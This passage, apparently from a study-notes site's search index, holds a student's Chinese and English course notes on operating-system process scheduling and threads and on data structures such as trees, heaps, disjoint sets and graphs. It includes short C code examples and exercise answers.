<p>\u4e00\u4e9b\u5e38\u89c1\u7684\u8fdb\u7a0b\u8c03\u5ea6\u7b97\u6cd5</p> <ul> <li>FCFS \u5148\u8fdb\u5148\u670d\u52a1\uff0c\u975e\u62a2\u5360\u7684\u8c03\u5ea6\u65b9\u6cd5\uff0c\u6700\u5927\u4f18\u70b9\u662f\u5b9e\u73b0\u5c31\u7b80\u5355\uff0c\u6709\u5229\u4e8eCPU\u7e41\u5fd9\uff0c\u4e0d\u5229\u4e8eIO\u7e41\u5fd9\uff0c\u76f8\u5bf9\u540e\u9762\u7684\u7b97\u6cd5\u800c\u8a00\uff1a\u6709\u5229\u4e8e\u957f\u4efb\u52a1\uff0c\u4e0d\u5229\u4e8e\u77ed\u4efb\u52a1</li> <li>SJF\uff0c\u5f53\u591a\u4e2a\u8fdb\u7a0b\u5904\u4e8e\u5c31\u7eea\u6001\u7684\u65f6\u5019\uff0c\u9009\u62e9\u9700\u8981\u8fd0\u884c\u65f6\u95f4\u6700\u77ed\u7684\u8fdb\u7a0b\u8fdb\u884c\u8fd0\u884c\uff0c\u6700\u5927\u4f18\u70b9\u5728\u4e8e\uff0c\u53ef\u4ee5\u4fdd\u8bc1\u5e73\u5747\u7b49\u5f85\u65f6\u95f4\u6700\u5c0f\uff0c\u4f46\u662f\u7f3a\u70b9\u5728\u4e8e\u4f1a\u5bfc\u81f4\u8fd0\u884c\u65f6\u95f4\u8f83\u957f\u7684\u8fdb\u7a0b\u201c\u9965\u997f\u201d\uff0c\u975e\u62a2\u5360\uff0c\u5f53\u6709\u66f4\u65b0\u7684\u66f4\u5c11\u65f6\u95f4\u8fdb\u7a0b\u8fdb\u5165\uff0c\u4e5f\u5f97\u7b49\u73b0\u5728\u8fd9\u4e2a\u8fdb\u7a0b\u6267\u884c\u5b8c</li> <li>SRTF\uff0c\u4e0eSJF\u57fa\u672c\u5b8c\u5168\u4e00\u6837\uff0c\u5176\u4f1a\u5728\u66f4\u65b0\u66f4\u5c11\u65f6\u95f4\u8fdb\u7a0b\u8fdb\u5165\u65f6\uff0c\u62a2\u5360CPU\uff0c\u4e5f\u4f1a\u201c\u9965\u997f\u201d</li> <li>RR \u65f6\u95f4\u7247\u8f6e\u8f6c\uff0c\u5c5e\u4e8e\u62a2\u5360\u5f0f\u8c03\u5ea6\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u6267\u884c\u4e00\u4e2a\u65f6\u95f4\u7247\uff0c\u5b8c\u6210\u4e4b\u540e\u63d2\u5165\u5230FIFO\u961f\u5217</li> <li> <p>Priority Scheduling\uff0c\u4f18\u5148\u7ea7\u8c03\u5ea6\uff0c\u57fa\u672c\u7b49\u4e8eSRTF\u91cc\u7684\u201c\u66f4\u5c11\u65f6\u95f4\u201d\u6539\u4e3a\u201c\u4f18\u5148\u7ea7\u66f4\u9ad8\u201d\uff0c\u5b9e\u9645\u4e0aSRTF\u662f\u4f18\u5148\u7ea7\u8c03\u5ea6\u7684\u7279\u4f8b\uff0c\u5c5e\u4e8e\u62a2\u5360\u5f0f\u8c03\u5ea6\uff0c\u4f1a\u5bfc\u81f4\u201c\u9965\u997f\u201d</p> </li> <li> <p>\u53ef\u4ee5\u8bbe\u7f6e\u9759\u6001\u4f18\u5148\u7ea7\u548c\u52a8\u6001\u4f18\u5148\u7ea7</p> </li> <li>IO\u8fdb\u7a0b\u5927\u4e8e\u975eIO\u8fdb\u7a0b\uff0c\u7cfb\u7edf\u8fdb\u7a0b\u5927\u4e8e\u7528\u6237\u8fdb\u7a0b\uff0c\u4ea4\u4e92\u6027\u8fdb\u7a0b\u5927\u4e8e\u975e\u4ea4\u4e92\u6027\u8fdb\u7a0b</li> <li>Multilevel Queue Scheduling\uff1a\u8bbe\u7f6e\u4e0d\u540c\u7684\u961f\u5217\uff0c\u6bcf\u4e2a\u961f\u5217\u53ef\u4ee5\u91c7\u53d6\u5404\u81ea\u7684\u8c03\u5ea6\u7b97\u6cd5\uff0c\u540c\u65f6\u961f\u5217\u548c\u961f\u5217\u4e4b\u95f4\u4e5f\u53ef\u4ee5\u8bbe\u8ba1\u8c03\u5ea6\u7b97\u6cd5\uff0c\u5f80\u5f80\u662f\u4f18\u5148\u7ea7\u8c03\u5ea6</li> <li>Multilevel Feedback Queue Scheduling\uff1a\u770b\u770bPPT\u548c\u738b\u9053\u7684\u5b9a\u4e49 \u4f3c\u4e4e\u6709\u4e0d\u540c*</li> </ul>"},{"location":"ZJU-course/OS/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/#16","title":"1.6 \u7ebf\u7a0b","text":"<p>\u5f15\u5165\u7ebf\u7a0b\u4e4b\u540e\uff0c\u7ebf\u7a0b\u662fCPU\u5206\u914d\u7684\u5355\u4f4d\uff0c\u800c\u8fdb\u7a0b\u5219\u662fCPU\u4ee5\u5916\u7cfb\u7edf\u8d44\u6e90\u7684\u5206\u914d\u5355\u4f4d</p> <p>\u7ebf\u7a0b\u7684\u5b9e\u73b0\u65b9\u5f0f</p> <p>\u7ebf\u7a0b\u672c\u8eab\u7684\u5b9e\u73b0\u65b9\u5f0f\u5206\u4e3a\u4e24\u79cd\uff0c\u7528\u6237\u7ea7\u7ebf\u7a0b User-level Thread ULT \u548c \u5185\u6838\u7ea7\u7ebf\u7a0b Kernel-Level Thread KLT</p> <ul> <li> <p>ULT \u7ebf\u7a0b\u7ba1\u7406\uff1a\u521b\u5efa\uff0c\u5207\u6362\u548c\u64a4\u9500\u90fd\u5728\u7528\u6237\u6001\u5b8c\u6210\uff0c\u7528\u6237\u7a0b\u5e8f\u901a\u8fc7\u8c03\u7528\u7ebf\u7a0b\u5e93\u6765\u5b8c\u6210\u8fd9\u4e2a\u5de5\u4f5c</p> </li> <li> <p>\u4f18\u70b9\uff1a\u7ebf\u7a0b\u5207\u6362\u66f4\u5feb\uff0c\u53ef\u4ee5\u81ea\u884c\u5b9e\u73b0\u4e13\u95e8\u7684\u8c03\u5ea6\u7b97\u6cd5\uff0c\u5b9e\u73b0\u662f\u5e73\u53f0\u65e0\u5173\u7684</p> </li> <li>\u7f3a\u70b9\uff1a\u4e00\u4e2a\u7ebf\u7a0b\u7684\u963b\u585e\u4f7f\u5f97\u6574\u4e2a\u8fdb\u7a0b\u5185\u7684\u7ebf\u7a0b\u90fd\u88ab\u963b\u585e\uff0c\u4e0d\u80fd\u53d1\u6325\u591a\u6838CPU\u7684\u4f18\u52bf\uff08\u4e00\u4e2a\u8fdb\u7a0b\u53ea\u4f1a\u88ab\u5206\u914d\u5230\u4e00\u4e2aCPU\uff09</li> <li> <p>KLT \u7ebf\u7a0b\u7ba1\u7406\u7684\u5de5\u4f5c\u90fd\u5728\u5185\u6838\u6001\u5b8c\u6210</p> </li> <li> <p>\u4f18\u70b9\uff1a\u80fd\u53d1\u6325\u591aCPU\u4f18\u52bf\uff0c\u4e00\u4e2a\u7ebf\u7a0b\u88ab\u963b\u585e\u4e0d\u5f71\u54cd\u5176\u4ed6\u7ebf\u7a0b</p> </li> <li>\u7f3a\u70b9\uff1a\u540c\u4e00\u8fdb\u7a0b\u7684\u7ebf\u7a0b\u8c03\u5ea6\u4ecd\u7136\u8981\u8fdb\u884c\u5185\u6838\u6001\u7528\u6237\u6001\u5207\u6362\uff0c\u5f00\u9500\u8f83\u5927</li> <li>\u7ec4\u5408\u65b9\u5f0f\uff1a\u65e2\u53ef\u4ee5\u521b\u5efaULT\u4e5f\u53ef\u4ee5\u521b\u5efaKLT</li> </ul> <p>\u7ebf\u7a0b\u5e93</p> <p>\u7ebf\u7a0b\u5e93\u53ef\u80fd\u662f\u521b\u5efa\u4e86\u7528\u6237\u7ebf\u7a0b\uff0c\u4e5f\u53ef\u4ee5\u662f\u5bf9\u7cfb\u7edf\u8c03\u7528\u521b\u5efa\u5185\u6838\u7ebf\u7a0b\u7684\u4e00\u4e2a\u5c01\u88c5\uff0c\u73b0\u4ee3\u5e38\u7528\u7684\u7ebf\u7a0b\u5e93\u6709</p> <ul> <li>POSIX Pthreads: \u7c7bUNIX\u7cfb\u7edf</li> <li>Windows API: Windows\u7cfb\u7edf</li> <li>Java\uff1aJVM\u81ea\u52a8\u8c03\u7528\u5bbf\u4e3b\u7cfb\u7edf\u81ea\u8eab\u7684\u7ebf\u7a0b\u5e93</li> </ul> <p>\u591a\u7ebf\u7a0b\u6a21\u578b</p> <ul> <li>Many-to-one\uff0c\u5176\u5b9e\u5c31\u662f\u53ea\u652f\u6301ULT</li> <li>one-to-one\uff0c\u5176\u5b9e\u5c31\u662f\u6307\u652f\u6301KLT</li> <li>Many-to-Many\uff0c\u5176\u5b9e\u5c31\u662f\u7ec4\u5408\u6a21\u5f0f\uff0cn\u4e2a\u7528\u6237\u7ea7\u7ebf\u7a0b\u6620\u5c04\u5230m\u4e2a\u5185\u6838\u7ea7\u7ebf\u7a0b\uff0c\u8981\u6c42 \\(n\\geq m\\)</li> </ul>"},{"location":"ZJU-course/OS/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/#17","title":"1.7 \u4e60\u9898\u6536\u5f55","text":"<p>\u738b\u9053</p> <ul> <li>\u5e76\u53d1\u8fdb\u7a0b\u7684\u8fd0\u884c\u7ed3\u679c\u6709\u4e0d\u53ef\u518d\u73b0\u6027</li> <li>\u5355\u5904\u7406\u5668\u4e2d\uff0c\u4efb\u4f55\u65f6\u523b\u90fd\u53ea\u6709\u4e00\u4e2a\u8fdb\u7a0b\u5904\u4e8e\u8fd0\u884c\u6001 \u00d7 \u6b7b\u9501\u65f6\u53ef\u80fd\u5168\u90e8\u5904\u4e8e\u963b\u585e\u6001</li> <li>\u5355\u5904\u7406\u5668\u4e2d\uff0c\u82e5\u540c\u65f6\u5b58\u572810\u4e2a\u8fdb\u7a0b\uff0c\u6700\u591a\u53ea\u67099\u4e2a\u5904\u4e8e\u5c31\u7eea\u6001</li> <li>\u8fdb\u7a0b\u4e4b\u95f4\u53ef\u80fd\u662f\u65e0\u5173\u7684\uff0c\u4e5f\u53ef\u80fd\u662f\u76f8\u5173\u7684</li> <li>PCB\u4e2d\u4e0d\u5e94\u8be5\u5305\u542b \u4fe1\u53f7\u91cf</li> <li>\u952e\u76d8\u8f93\u5165\uff0c\u4e0d\u662f\u591a\u7ebf\u7a0b\u7cfb\u7edf\u7684\u7279\u957f\uff0c\u56e0\u4e3a\u8f93\u5165\u5f88\u6162</li> <li>\u5f53\u8fdb\u7a0b\u7528\u8fd0\u884c\u6001\u53d8\u4e3a\u5c31\u7eea\u6001\uff0c\u5fc5\u7136\u5f15\u8d77\u8fdb\u7a0b\u5207\u6362</li> <li>\u4fe1\u53f7\u91cf\u7684 wait \u5bfc\u81f4\u8fdb\u5165 waiting \u800c\u4e0d\u662f ready</li> <li>\u4e0d\u7ba1\u7cfb\u7edf\u662f\u5426\u652f\u6301\u7ebf\u7a0b\uff0c\u8fdb\u7a0b\u90fd\u662f\u8d44\u6e90\u5206\u914d\u7684\u57fa\u672c\u5355\u4f4d \u221a</li> <li>\u4f5c\u4e1a\u662f\u6307\u7528\u6237\u7684\u4efb\u52a1\uff0c\u800c\u8fdb\u7a0b\u662f\u7531\u64cd\u4f5c\u7cfb\u7edf\u7ba1\u7406\u7684\uff0c\u4e8c\u8005\u89c6\u89d2\u4e0d\u540c</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u7b54\u6848\u662fC</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u7b54\u6848\u662fD\uff0c\u4f46\u662f\u6211\u611f\u89c9\u5b83\u5728\u80e1\u8a00\u4e71\u8bed</li> </ul> <p>jjm \u4f5c\u4e1a\u9898</p> <p>\u200b\u200b</p> <ul> <li>\u7b54\u6848\u662f8 \u5b50\u8fdb\u7a0b\u7684\u4fee\u6539\u4e0d\u5f71\u54cd\u7236\u8fdb\u7a0b</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u7b54\u6848\u662f 16 \u6ce8\u610f\u5927\u6807\u9898\u8bf4\u4e86 including the initial parent process</li> </ul> <p>\u200b\u200b</p> <ul> <li>6 2</li> </ul> <p>\u200b\u200b</p> <p>\u5b50\u8fdb\u7a0b\u5373\u4fbf\u521b\u9020\u4e86\u7ebf\u7a0b\uff0c\u4e5f\u65e0\u6cd5\u5f71\u54cd\u7236\u8fdb\u7a0b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li>inter-process</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/fds/FDS/","title":"\u6570\u636e\u7ed3\u6784\u57fa\u7840","text":"<p>\u6570\u636e\u7ed3\u6784\u57fa\u7840</p> <p>\u672c\u7bc7\u7b14\u8bb0\u548ccs61b\u6709\u5f88\u591a\u7684\u91cd\u590d\u4e4b\u5904\uff0c\u76f8\u5bf9\u6765\u8bf4\u6211\u4f1a\u5bf961b\u505a\u7684\u66f4\u52a0\u8be6\u7ec6\u4e00\u70b9 \u9664\u4e86\u56fe\u8bba\u7684\u90e8\u5206\uff0c\u8bf7\u53c2\u7167\u8fd9\u7bc7\u7b14\u8bb0\u3002\u672b\u5c3e\u6709\u6211\u671f\u672b\u590d\u4e60\u65f6\u8bb0\u5f55\u7684\u4e00\u4e9b\u9519\u9898\uff0c\u4f46\u5e76\u672a\u5f88\u8be6\u7ec6</p>"},{"location":"ZJU-course/fds/FDS/#bonus","title":"bonus","text":"<p>bonus problem1 queque using two stacks.</p>"},{"location":"ZJU-course/fds/FDS/#never-test-your-code-in-pta-be-careful-to-submit-in-pta","title":"never test your code in PTA, be careful to submit in PTA","text":"<p>some tips of C IO</p> <p>If we want use scanf and getchar together, and we should pay attention that scanf will leave a '\\n\\' and will be received by next getchar()</p> <p>read\u662f\u9605\u8bfb\u7684\uff0c\u4e0d\u5fc5\u63d0\u4ea4 PR\u662f\u7528\u6765\u63d0\u4ea4\u7684</p> <p>\u6ce8\u610f\u6587\u4ef6\u5c5e\u6027\u91cc\u9762\u4e0d\u8981\u5199\u5230\u81ea\u5df1\u540d\u5b57\uff0c\u5c4f\u853d\u6587\u4ef6\u5c5e\u6027\u7684\u59d3\u540d\u663e\u793a</p>"},{"location":"ZJU-course/fds/FDS/#part1-algorithm-analysis","title":"part1 algorithm analysis","text":""},{"location":"ZJU-course/fds/FDS/#time-complexity","title":"time complexity","text":"<p>We usual express the time complexity of an algorithm by T(n), in which n is the parameter the algorithm needs.</p> <p>An important example, how to calculate the time complexity of recursive function like Fibonacci</p>"},{"location":"ZJU-course/fds/FDS/#compare-the-algorithms-by-an-example-of-maxsubsequencesum","title":"compare the algorithms by an example of MaxSubsequenceSum","text":"<p>Given integers array A1 to An, find the maximum value of sum of subarray from Ai to Aj</p> <ol> <li> <p>The most obvious thought is to use three loops and check every possible subarray. It is O(n).</p> </li> <li> <p>But we can make some changes, it is easy to find we only need two loops</p> </li> </ol> <pre><code>int MaxSubsequendceSum(const A[],int N){\n    int ThisSum,MaxSum,i,j,k;\n    MaxSum=0;\n    for(int i=0;i&lt;N;i++){\n        ThisSum=0;\n        for(j=i;j&lt;N;j++){\n            ThisSum+=A[j];\n            if(ThisSum&gt;MaxSum){...}\n        }\n    }\n    return MaxSum;\n}\n</code></pre> <p>Besides, when we have O(n^2) complexity, we can refer to O(nlog(n));</p> <ol> <li>In the question, we can use divide and conquer(\u5206\u6cbb\u6cd5). Devide and conquer are recurive mostly, the expression     is T(N)=2*T(N/2) + cN, T(1)=O(1);           T(N)=2^kO(1)+ckN    2\u8fd9\u4e2a\u7cfb\u6570\u662f\u5728\u672c\u9898\u7684\u60c5\u5f62\u4e0b\uff0c\u4f46\u7cfb\u6570\u4e0d\u5f71\u54cd\u6211\u4eec\u7684\u65f6\u95f4\u590d\u6742\u5ea6</li> <li>On-line algorithms. Awesome, we can use an algorithm make complexity by O(n).     If the former part of subsequence, they must be deleted.</li> </ol> <pre><code>int MaxSubsequendceSum(const A[],int N){\n    int ThisSum,MaxSum,i,j,k;\n    MaxSum=0;\n    for(int i=0;i&lt;N;i++){\n        ThisSum+=A[i];\n        if(ThisSum&gt;MaxSum){\n            MaxSum=ThisSum;\n        }else if(ThisSum&lt;0){\n            ThisSum=0;\n        }\n    }\n    return MaxSum;\n}\n</code></pre> <p>\u200d</p>"},{"location":"ZJU-course/fds/FDS/#logarithms-in-the-running-time","title":"logarithms in the running time","text":"<p>Logarithms is about the logn in the time complexity. For example, the binary search is a good representation of logarithms  </p> <p>Binary search can use loop or recursion. We cna write a recursive expression.</p> <p>Tips: binary search need the array is already sorted, which also need the array to be static. If we always add and delete data, it will take a lot of time to maintian the sorted array</p>"},{"location":"ZJU-course/fds/FDS/#check-the-analysis","title":"check the analysis","text":"<p>If T(N)=O(N)  check if T(2N)/T(N) = 2;                 N^2                                 4</p> <p>T(N)=O(f(N)), check If T(N)/f(N) is contant.</p> <p>N need to be large enough.</p>"},{"location":"ZJU-course/fds/FDS/#part2-lists-stacks-quences","title":"part2 lists, stacks, quences","text":""},{"location":"ZJU-course/fds/FDS/#abstract-data-type-adt","title":"abstract data type (ADT","text":"<p>data type={object}+{operations}.</p> <p>The abstract data type is separated from its implementation.</p>"},{"location":"ZJU-course/fds/FDS/#the-list-adt","title":"the list ADT","text":"<p>objects: item0, item1, ... itemN-1</p> <p>operations: refer to book, insert, delete and find are most important.</p>"},{"location":"ZJU-course/fds/FDS/#list-examples","title":"list examples","text":"<ol> <li>polynimial</li> </ol> <p>\u4e0d\u8981\u7528\u6307\u6570\u4f5c\u4e3a\u4e0b\u6807\uff0c\u4f1a\u5bfc\u81f4\u7a7a\u95f4\u6d6a\u8d39\uff0c\u5efa\u8bae\u662fstruct array or struct linked list.</p> <ol> <li>mutilists</li> </ol> <p>40000 students and 2000 courses, we want to know each student's courses, and use course to know who choose this course</p> <p>We cam use array[40000][2000] but it wastes a lot of space. So, we can use mutilists </p>"},{"location":"ZJU-course/fds/FDS/#stack","title":"stack","text":"<p>\u524d\u7f00\u8868\u8fbe\u5f0f\u548c\u540e\u7f00\u8868\u8fbe\u5f0f</p>"},{"location":"ZJU-course/fds/FDS/#queue","title":"queue","text":"<p>circular queue</p> <p>front and rear</p> <p>what is empty and what is full?</p> <p>\u200d</p>"},{"location":"ZJU-course/fds/FDS/#tree","title":"tree","text":""},{"location":"ZJU-course/fds/FDS/#the-basic-features-of-tree","title":"the basic features of tree","text":"<p>The choice of root is important of the features of the tree.</p> <ul> <li> <p>Tree is composed of the N nodes and N-1 edges.</p> </li> <li> <p>The roots are the nodes without parents   The leaves are the nodes without children</p> </li> <li>The number of node in the tree can be empty.</li> <li>The subtrees of a node can't be connected, there is no loop in the tree.</li> <li>**the degree of the node ** the number of subtrees of the node</li> <li>**the degree of the tree ** the max degree of the node max{degree(node)}</li> <li>parent is the node has subtrees   children are the nodes have parent   siblings are children have the same parent</li> <li>the path from one node to another is unique, the length of the path is the number of edges between.</li> <li>the depth of node is the length of path between it and root, the depth of root is 0.</li> <li>the height of node is the longest length of the path between it and the leaves</li> <li>the height of tree is the height of root   \u5bf9\u4e8e\u5355\u6839\u8282\u70b9\u7684\u6811\uff0cheight\u4e3a0</li> <li>ancestors of a node are the nodes between it and the root   descendants of a node are the nodes in its subtrees.</li> </ul>"},{"location":"ZJU-course/fds/FDS/#some-special-trees","title":"some special trees","text":"<ul> <li>binary trees: the degree of the node is the less than 2   The pointer of the binary tree is the 2*n but the not-null pointers is n-1, it is waste.   \u5982\u679c\u662f\u5de6\u6307\u9488\u4e3anull\uff0c\u5219\u653e\u7f6e\u4e3a\u4e2d\u5e8f\u7684\u524d\u4e00\u4e2a\u8282\u70b9\uff0c\u82e5\u53f3\u6307\u9488\u4e3anull\uff0c\u5219\u653e\u7f6e\u4e2d\u5e8f\u7684\u540e\u4e00\u4e2a\u8282\u70b9\u3002\u5bf9\u4e8e\u4e2d\u5e8f\u7684\u6700\u540e\u4e00\u4e2a\u8282\u70b9\u548c\u7b2c\u4e00\u4e2a\u8282\u70b9   \u53ef\u80fd\u9700\u8981\u4e00\u4e2a\u7a7a\u5934\u8282\u70b9\u6765\u4f5c\u4e3a\u4ed6\u4eec\u6307\u9488\u6307\u5411\u7684\u5bf9\u8c61   \u4e8c\u53c9\u6811\u4e2d\uff0c\u53f6\u5b50\u7ed3\u70b9\u7684\u4e2a\u6570\u4e3a\u5ea6\u4e3a2\u7684\u8282\u70b9\u4e2a\u6570\u52a0\u4e00</li> </ul>"},{"location":"ZJU-course/fds/FDS/#the-implementation-of-the-tree","title":"the implementation of the tree","text":"<p>The most direct way to implement the tree is the linked list, however the number of pointers is uncertain But we can make some modified, each point have the two pointers, to the FirstChild and the NextSibling. It can finish but the implementation of the same tree may be different in this way.</p> <p>The implementation of FirstChild-NextSibling can turn all trees to binary tree.</p> <p>create the expression tree</p> <p>we can use the postfix expression to create the expression treep</p>"},{"location":"ZJU-course/fds/FDS/#the-traversal-of-the-tree","title":"the traversal of the tree","text":"<p>To visit each node exactly once,</p> <p>preorder root is the first</p> <pre><code>void preorder(tree_ptr tree){\n    if(tree){\n        visit(tree);\n        for(each child of tree){\n            preorder(child);\n        }\n    }\n}\n</code></pre> <p>postorder root is the last</p> <pre><code>void postorder(tree_ptr tree){\n    if(tree){\n        for(each child of tree){\n            preorder(child);\n        }\n        visit(tree);\n    }\n}\n</code></pre> <p>levelorder </p> <pre><code>void levelorder(tree_ptr tree){\n    enqueue(tree);\n    while(queue is not empty){\n        visit(T=dequeue());\n        for(each child of T){\n            enqueue(child);\n        }\n    }\n}\n</code></pre> <p>inorder \u53ea\u9488\u5bf9\u4e8c\u53c9\u6811\u7248\u672c</p> <pre><code>void inorder(tree_ptr tree){\n    if(tree){\n        inorder(tree-&gt;left);\n        visit(tree-&gt;element);\n        inorder(tree-&gt;right);\n    }\n}\n</code></pre> <p>\u5bf9\u4e8e\u4e00\u4e9b\u9012\u5f52\u4ee3\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u81ea\u5df1\u521b\u9020\u6808\u53bb\u7528\u5faa\u73af\u5b9e\u73b0\u9012\u5f52</p> <p>thread tree</p>"},{"location":"ZJU-course/fds/FDS/#binary-tree","title":"binary tree","text":"<p>properties of binary tree</p> <p>n0 n1 n2 n2=n0+1</p> <p>n=n0+n1+n2 n0+n1+n2-1=E=2*n2+n1</p> <p>skewed binary tree.</p> <p>complete binary tree</p> <p>BST</p> <p>find</p>"},{"location":"ZJU-course/fds/FDS/#priority-queues-heaps","title":"priority queues (heaps)","text":"<p>The min tree is the tree that its children always smaller than its parent. And the min heap is the completed min tree.</p> <p>delete the element with the highest/lowest priority</p> <p>Insert and delete min</p> <p>insertion is random and the deletion is always the lowest</p> <p>binary heap</p> <ol> <li>structure property: it is a complete binary tree, which is a sequential set of perfect binary tree. (\u5b8c\u7f8e\u4e8c\u53c9\u6811\u4ece\u4e0a\u5230\u4e0b\uff0c\u4ece\u5de6\u5230\u53f3\u7f16\u53f7\uff0c\u5b8c\u5168\u4e8c\u53c9\u6811\u662f\u5176\u4e2d\u8fde\u7eed\u7684\u5b50\u96c6)</li> <li>\u63d2\u5165\u9700\u8981\u6784\u5efa\u4e00\u4e2a\u5b8c\u5168\u4e8c\u53c9\u6811\uff0c\u4ee5\u6700\u5c0f\u5806\u4e3a\u4f8b\uff0c\u4fdd\u8bc1\u5b50\u8282\u70b9\u5927\u4e8e\u7236\u8282\u70b9</li> </ol> <p>insert</p> <p>\u4ee5\u6700\u5c0f\u5806\u4e3a\u4f8b</p> <p>\u5148\u5047\u8bbe\u8981\u63d2\u5165\u7684\u5143\u7d20\u51fa\u73b0\u5728\u5b8c\u5168\u4e8c\u53c9\u6811\u7684\u6700\u540e\u4e00\u683c\uff0c\u7136\u540e\u5411\u4e0a\u5bfb\u627e\uff0c\u5982\u679c\u4e0a\u9762\u6709\u6bd4\u4ed6\u5927\u7684\uff0c\u5c31\u6362\u4e0b\u6765\uff0c\u5982\u679c\u7236\u8282\u70b9\u6bd4\u5b83\u5c0f\uff0c\u5c31\u7ed3\u675f</p> <pre><code>void insert(ElementType X, Heap H){\n    int i;\n    if(isFull(H)){\n        printf(\"error the heap is full\");\n    }\n    for(int i=++(H-&gt;size);H-&gt;Elements[i/2]&gt;X;i=i/2){\n        H-&gt;Elements[i]=H-&gt;Elements[i/2];\n    }\n    H-&gt;Elements[i]=X;\n}\n</code></pre> <p>delete min</p> <p>\u8fd8\u662f\u4ee5\u6700\u5c0f\u5806\u4e3a\u4f8b</p> <pre><code>ElementType delete_min(Heap h){\n    if(isEmpty(h)){\n        printf(\"ERROR delete empty heap\\n\");\n        return h-&gt;Elements[0];\n    }\n    ElementType ans=h-&gt;Elements[1];\n    ElementType LastElement = h-&gt;Elements[h-&gt;Size--]; //\u53d6\u4e86\u6700\u540e\u4e00\u4e2a\uff0c\u5e76\u4e14\u628asize--\n    int child;\n    for(int i=1;i*2&lt;h-&gt;Size;i=child){\n        child=i*2;\n        if(child!=h-&gt;Size &amp;&amp; h-&gt;Elements[child+1]&lt;h-&gt;ELements[child]){\n            child++;\n        }\n        if(LastElement &gt; h-&gt;Elements[child]){\n            h-&gt;Elements[i]=h-&gt;Elements[child];\n        }else{\n            break;\n        }\n    }\n    H-&gt;Elements[i]=LastElement;\n    return ans;\n}\n</code></pre> <p>decrease key  \u5bf9\u4e8e\u4e00\u4e2akey\u7684value\uff0c\u964d\u4f4e\u5b83\u7684\u503c\uff0c\u4e5f\u5c31\u662f\u63d0\u9ad8\u5b83\u7684\u4f18\u5148\u7ea7</p> <p>increase key  \u505a\u76f8\u53cd\u7684\u64cd\u4f5c</p> <p>delete key \u5220\u9664key\u5bf9\u5e94\u7684\u7ed3\u70b9   \u5148decrease key\u4f7f\u5176\u53d8\u4e3a\u6839\u8282\u70b9 \u7136\u540edelete min</p> <p>build heap  \u5148\u4e0d\u7ba1\u987a\u5e8f\u76f4\u63a5\u5efa\u7acb\u5806 \u4ece\u6700\u5927\u975e\u53f6\u5b50\u8282\u70b9\u5f00\u59cb\u5230\u6839\u8282\u70b9\uff0c\u5404\u505a\u4e00\u6b21percolateDown O(N)</p>"},{"location":"ZJU-course/fds/FDS/#disjoint-set","title":"disjoint set","text":"<p>the definition of equivalence relation</p> <p>The equivalence relation over S if and only if it is symmetric, reflexive and transitive over S.</p> <p>symmetric \u5bf9\u79f0\u6027</p> <p>reflexive \u81ea\u53cd\u6027</p> <p>transitive \u4f20\u9012\u6027</p> <p>equivalence class is the subclass of a set and all of elements in it has equivalence.</p> <p>(2,4) = (1,(2,3))=(1,(1,(2,2)))=(1,(1,(1,(1,2))))</p> <p>find</p> <pre><code>find(ElementType X,DisJoint S){\n    if(S[x]&lt;=0) return X;\n    else return S[x]=find(S[x],S);\n}\n//\u8fd4\u56de\u6839\u8282\u70b9\nint find(int m,int set_joint[]){\n    int root,temp,lead;\n    for(root=m;set_joint[root]&gt;0;root=set_joint[root]);\n    for(temp=m;temp!=root;temp=lead){\n        lead=set_joint[temp];\n        set_joint[temp]=root;\n    }\n    return root;\n}\n</code></pre> <p>setunion</p> <pre><code>setunion(find(1),find(2));\n//\u94fe\u63a5\u4e24\u4e2a\u8282\u70b9\u662f\u5bf9\u5176\u6839\u8282\u70b9\u8fdb\u884c\u64cd\u4f5c\nvoid make_union(int m,int n,int set_joint[]){\n    int m_root=find(m,set_joint);\n    int n_root=find(n,set_joint);\n    if(set_joint[m_root]&lt;set_joint[n_root]){\n        int temp=set_joint[n_root];\n        set_joint[n_root]=m_root;\n        set_joint[m_root]+=temp;\n    }else{\n        int temp=set_joint[m_root];\n        set_joint[m_root]=n_root;\n        set_joint[n_root]+=temp;\n    }\n}\n</code></pre>"},{"location":"ZJU-course/fds/FDS/#graph","title":"graph","text":"<p>definition</p> <p>V(G): the set of vertices, which is nonempty E(G): the set of edges, can be empty</p> <p>In undirected graph (v1, v2)=(v2, v1); they are same edge</p> <p>In directed graph(digraph)  !=  <p>In the lesson FDS, we add some limitation to the graph</p> <ol> <li>we don't have self loop</li> <li>we don't have multiedges between two vertices</li> </ol> <p>some conceptions</p> <ol> <li>v1 and v2 are adjacent which means there is an edge between them     In directed graph, we called v1 is adjacent to v2 and v2 is adjacent from v1. the edge is incident on v1 and v2</li> <li>subgraph V(G1) is subset of V(G)&amp;&amp; E(G1) is the subset of E(G)</li> <li>path from v1 to v2  v1, v11, v12 .... v1n, v2     the length of path</li> <li>simple path there is no repeat vertices in the path, and the only v1 and v2 can be same</li> <li>cycle v1==v2</li> <li>the graph is connected all of pair of vertices is connected</li> <li>the maximal connected subgraph \u8054\u901a\u5b50\u56fe\u4e2d\u6709\u6700\u591a\u8282\u70b9\u7684\u90a3\u4e2a</li> <li>e is the sum of degree /2</li> </ol> <p>some special graphs</p> <ol> <li>complete graph: has the maximum number of edges  C(n, 2)</li> <li>tree is connected and acyclic graph</li> <li>DAG is a directed and acyclic graph  \u6709\u5411\u65e0\u73af\u56fe</li> <li>strongly connected directed graph  all of pairs of v1 and v2 we can find path from v1 to v2 and v2 to v1.     If it is connected when we overlook the directed feature of edges, we call it weakly connected graph.</li> <li>strongly connected component is the maximal subgrah that is strongly connected ( a single vertice can be a strongly connected subgraph)</li> <li>the number of edges incident to v and for directed graph we have in-degree and out-degree</li> </ol>"},{"location":"ZJU-course/fds/FDS/#representation-of-the-graph","title":"representation of the graph","text":"<p>** we can use the adjacency matric**</p> <pre><code>0 1 0\n1 0 0\n0 0 0\n</code></pre> 